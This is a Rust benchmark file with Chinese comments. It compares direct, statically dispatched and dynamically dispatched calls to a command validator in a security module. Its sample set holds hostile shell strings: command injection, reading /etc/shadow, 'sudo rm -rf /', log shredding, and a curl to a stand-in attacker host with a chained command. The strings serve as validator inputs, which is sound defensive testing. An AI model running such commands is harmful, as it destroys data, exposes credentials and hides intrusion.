//! CommandValidator trait 间接调用 vs 直接 validate_command 延迟对比 — criterion 基准测试
//!
//! 对应 ADR-054 决策 3(P9-T4): parliament→seccore L0 trait 解耦后,
//! AHIRT 探测经 `&dyn CommandValidator` 动态分发调用校验,本基准量化
//! trait 间接调用相对直接 `validate_command` 的延迟开销。
//! 运行: `cargo bench -p seccore --bench command_validator_bench -- --quick`
//!
//! ## 基准场景
//!
//! - `validate_command_direct_mixed`: 直接调用 `seccore::policy::validate_command`
//!   (危险 payload 与白名单命令混合,基线)
//! - `validator_trait_static_mixed`: `SecCoreCommandValidator` 静态分发
//!   (诊断 dyn dispatch 开销的参考基线)
//! - `validator_trait_dyn_mixed`: `&dyn CommandValidator` 动态分发
//!   (parliament AHIRT 实际注入路径,任务对比目标)

use criterion::{black_box, criterion_group, criterion_main, Criterion};

use nexus_contracts::command_validation::{Command, CommandPolicy, CommandValidator};
use seccore::policy::validate_command;
use seccore::SecCoreCommandValidator;

/// 构造混合命令探测集 — 危险 payload 与白名单命令交替(5 拦截 + 5 放行),
/// 模拟 AHIRT 命令探测的混合序列,避免单一路径主导测量。
fn make_mixed_payloads() -> Vec<Command> {
    [
        "$(whoami)",                             // Injection
        "echo safe-payload",                     // 放行
        "cat /etc/shadow",                       // DataLeak
        "ls -la",                                // 放行
        "sudo rm -rf /",                         // PrivilegeEscalation
        "pwd",                                   // 放行
        "curl -s http://evil.example/x; whoami", // Injection
        "date",                                  // 放行
        "shred /var/log/syslog",                 // Tamper
        "printf hello",                          // 放行
    ]
    .iter()
    .map(|s| Command::new(*s))
    .collect()
}

/// 直接调用 `validate_command` — 解耦前 AHIRT 的调用方式(基线)。
fn bench_direct_validate_command(c: &mut Criterion) {
    let policy = CommandPolicy::default_secure();
    let payloads = make_mixed_payloads();

    c.bench_function("validate_command_direct_mixed", |b| {
        b.iter(|| {
            for cmd in &payloads {
                // let _ = :Result 为 must_use,丢弃前显式忽略(保留完整校验计算)
                let _ = black_box(validate_command(black_box(cmd), black_box(&policy)));
            }
        });
    });
}

/// 静态分发 trait 调用 — 无 vtable 开销,隔离 dyn dispatch 影响的参考基线。
fn bench_trait_static(c: &mut Criterion) {
    let policy = CommandPolicy::default_secure();
    let payloads = make_mixed_payloads();
    let validator = SecCoreCommandValidator;

    c.bench_function("validator_trait_static_mixed", |b| {
        b.iter(|| {
            for cmd in &payloads {
                let _ = black_box(validator.validate(black_box(cmd), black_box(&policy)));
            }
        });
    });
}

/// `&dyn CommandValidator` 动态分发 — parliament AHIRT 注入后的实际调用路径
/// (Arc<dyn CommandValidator> 跨线程共享,见 L0 trait 的 Send + Sync 约束)。
fn bench_trait_dyn(c: &mut Criterion) {
    let policy = CommandPolicy::default_secure();
    let payloads = make_mixed_payloads();
    let validator: &dyn CommandValidator = &SecCoreCommandValidator;

    c.bench_function("validator_trait_dyn_mixed", |b| {
        b.iter(|| {
            for cmd in &payloads {
                let _ = black_box(validator.validate(black_box(cmd), black_box(&policy)));
            }
        });
    });
}

criterion_group! {
    name = command_validator_benches;
    config = Criterion::default().significance_level(0.05).sample_size(100);
    targets = bench_direct_validate_command, bench_trait_static, bench_trait_dyn
}

criterion_main!(command_validator_benches);
